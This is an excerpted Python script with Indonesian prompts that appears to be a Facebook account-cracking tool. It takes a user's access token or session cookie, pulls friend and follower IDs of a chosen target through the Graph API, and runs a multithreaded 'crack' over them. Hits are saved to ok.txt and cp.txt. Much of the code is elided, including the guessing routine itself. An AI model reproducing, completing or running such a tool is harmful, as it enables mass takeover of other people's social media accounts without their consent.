...
def login():
	...
	if p in ('01','1'): #kondisi 1 login dengan token :)
		print('\n[!] HARAP MASUKAN ACCESS TOKEN ANDA CUK [!]\n')
		try:
			...
			os.system('clear')
			print('[×] Access token Facebook salah cuk [×]')
			time.sleep(2)
			login()
	elif p in ('02','2'): #kondisi 2 login dengan cookies
		print('\n[!] HARAP MASUKAN COOKIE ANDA CUK [!]\n')
		cookie=input("[!] Masukan Cookie Fb Anda Cuk : ")
		...
		if (find_token is None):
			print("[!] Cookie Facebook Salah Cuk")
			time.sleep(2)
			login()
		else:
			...
			nampung(to).menu()
	elif p=='99':exit(':( Terima kasih cuk!')#kondisi keluar dari script
	else:
		print('[!] Pilihan tidak Ada cuk [!]\n')
		time.sleep(2)
		login()
def logic():
	try:
...
class nampung:
	...
	def sendTeman(self):
		...
		with Bool(max_workers=35) as tokai:
			...
			time.sleep(1)
			print('[+] Jumlah ID teman Cuk :',len(idTeman),'\n[+] Starting crack, stop? CTRL + Z\n======================================\n')
			for id in idTeman:
		...
		b=input('[ ENTER UNTUK KEMBALI CUK ]')
		self.menu()
	def sendPublik(self):
		os.system('clear')
		print(f'{pub}\n[   Crack Daftar Teman Orang Cuk   ]\n')
		t=input('[!] Masukan ID Teman/Orang Cuk : ')
		try:
			r=json.loads(req.get(f'https://graph.facebook.com/{t}?access_token={self.token}').text)
			print('\n[+] Ok save : ok.txt\n[+] Cp save : cp.txt\n\n[+] Nama target/orang :',r['name'])
		except:
			print('[×] User tidak ditemukan cuk [×]')
			time.sleep(2)
			self.menu()
	...
	def sendFollow(self):
		...
		if p in ('01','1'):
			...
			bc=input("[CRACK SELESAI ENTER UNTUK KEMBALI CUK]")
			self.menu()
		elif p in ('02','2'):
			tr=input('\n[+] Masukan id target cuk : ')
			try:
